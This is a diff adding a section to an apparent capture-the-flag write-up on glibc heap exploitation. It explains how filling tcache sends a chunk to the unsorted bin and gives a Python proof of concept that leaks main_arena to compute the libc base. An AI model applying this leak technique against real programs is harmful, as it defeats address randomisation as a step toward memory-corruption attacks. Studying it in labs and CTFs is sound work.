@@ -283,8 +283,52 @@ Since the size that can be allocated by the program is either `0xF8 | 0x177` thi
 - 7 chunks will be placed in the tcache bin
 - 1 chunk will be placed in the unsorted bin
 
+But with that how do we get leak? Well if after getting a chunk into the unsorted bin the fd & bk will be pointing to the main_arena struct
 
+```c
+struct malloc_chunk {
 
+  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
+
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+
+```
+
+And if we reallocate it back we would get the chunk which was freed, only if the chunk which we are attempting to allocate is of the same size as the freed chunk
+
+Also take note that the data structure used by the Tcache is (Last In First Out := LIFO)
+
+This means if we get the chunk which was previously holding pointers to the libc region we can just set the first 8 bytes to some value and then when we use the `show_memory` function it would print out the data given + the pointer to the `main_arena`
+
+That works because `puts()` will keep on printing until it meets a null terminator
+
+Here's my poc for getting info leak:
+
+```python
+def solve():
+
+    for i in range(10):
+        allocate(0xf8, b"\x41" * 8)
+    
+    for j in range(9, -1, -1):
+        free_memory(j)
+    
+    for i in range(10):
+        allocate(0xf8, b"\x42" * 8)
+
+    show_memory(7)
+    io.recvuntil(b"B" * 8)
+    main_arena = u64(io.recvline().strip().ljust(8, b"\x00")) - 0x350
+    libc.address = main_arena - libc.sym["main_arena"]
+    info("libc base: %#x", libc.address)
+```
 
 
 
